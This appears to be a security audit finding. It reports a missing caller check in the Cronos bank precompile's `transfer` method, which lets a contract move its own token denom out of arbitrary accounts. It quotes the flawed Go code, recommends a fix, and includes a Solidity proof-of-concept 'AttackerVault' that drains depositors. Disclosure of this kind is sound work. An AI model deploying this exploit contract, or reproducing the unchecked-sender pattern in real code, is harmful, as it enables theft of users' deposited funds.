### Title
Bank Precompile `transfer` Method Allows Any Contract to Move Tokens From Arbitrary Accounts Without Owner Consent — (`File: x/cronos/keeper/precompiles/bank.go`)

### Summary
The `BankContract.Run` handler for the `transfer` method accepts a caller-supplied `sender` address and executes `bankKeeper.SendCoins(ctx, from, to, ...)` without verifying that `sender == contract.Caller()`. Any EVM contract can therefore drain any account's `evm/<contract_address>` native bank tokens to an arbitrary recipient, with no consent from the token holder. This is the direct Cronos analog of the external report's auth-bypass class: an action (asset transfer) is executed on behalf of a user without their knowledge or approval.

### Finding Description

In `x/cronos/keeper/precompiles/bank.go` the `TransferMethodName` case unpacks three ABI arguments — `sender`, `recipient`, `amount` — and uses `sender` verbatim as the `from` address passed to `bankKeeper.SendCoins`:

```go
// bank.go lines 175-192
sender := args[0].(common.Address)   // fully attacker-controlled
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())   // victim's address
to   := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())     // "evm/<calling_contract>"
amt   := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

There is **no check** that `sender == contract.Caller()`. The only guard present is `checkBlockedAddr(to)`, which only prevents sending to module-blocked addresses.

Compare with the `exec` helper used by the relayer precompile (`utils.go` lines 46-48), which explicitly enforces `caller == e.caller` before executing any state mutation. The bank precompile's `transfer` path has no equivalent guard.

The denom is scoped to `evm/<calling_contract>`, so the calling contract can only move tokens of its own denom. However, any contract can:
1. Call `bank.mint(victim, amount)` to credit a victim with `evm/<attacker_contract>` tokens (e.g., as receipt tokens for a deposit of real assets).
2. Later call `bank.transfer(victim, attacker, amount)` to silently drain those tokens back — without any approval from the victim.

### Impact Explanation

**Critical — Unauthorized transfer of precompile-controlled assets.**

`evm/<contract>` tokens are native Cosmos bank tokens managed exclusively through the bank precompile. The `transfer` method lets the owning contract move balances between any two accounts without the source account's consent. A malicious or compromised contract acting as a DeFi vault can:
- Accept user deposits of CRO/IBC vouchers and issue `evm/<vault>` receipt tokens.
- Silently call `bank.transfer(user, attacker, balance)` to steal all receipt tokens, blocking redemption of the underlying assets.

This satisfies the Critical criterion: *unauthorized transfer of precompile-controlled assets*.

### Likelihood Explanation

Any unprivileged actor can deploy an EVM contract on Cronos. No admin key, governance vote, or validator access is required. The prerequisite — that victims hold `evm/<attacker_contract>` tokens — is naturally satisfied whenever a contract issues receipt/LP tokens backed by real deposited value. The attack is silent and requires no victim interaction beyond the initial deposit.

### Recommendation

Add a caller-identity check in the `TransferMethodName` case, mirroring the pattern already used in `utils.go`:

```go
if sender != contract.Caller() {
    return nil, errors.New("sender is not authenticated: transfer requires sender == caller")
}
```

This ensures a contract can only initiate transfers *from itself*, not from arbitrary third-party accounts.

### Proof of Concept

```solidity
// Attacker contract
interface IBankPrecompile {
    function mint(address recipient, uint256 amount) external payable returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external payable returns (bool);
}

contract AttackerVault {
    IBankPrecompile constant bank = IBankPrecompile(address(0x64)); // 0x64 = 100

    // Step 1: issue receipt tokens to depositor (backed by real CRO sent to this contract)
    function deposit() external payable {
        bank.mint(msg.sender, msg.value);
    }

    // Step 2: owner silently drains all depositors — no approval needed
    function drain(address victim, uint256 amount, address attacker) external {
        bank.transfer(victim, attacker, amount);
        // Succeeds: denom = "evm/<this contract>", no consent check on victim
    }
}
```

1. Users call `deposit{value: X}()` and receive `evm/<AttackerVault>` tokens.
2. Attacker calls `drain(victim, X, attacker)` — `bankKeeper.SendCoins` executes unconditionally, transferring victim's tokens to attacker.
3. Victim's receipt tokens are gone; they cannot redeem the underlying CRO. [1](#0-0) [2](#0-1) [3](#0-2)
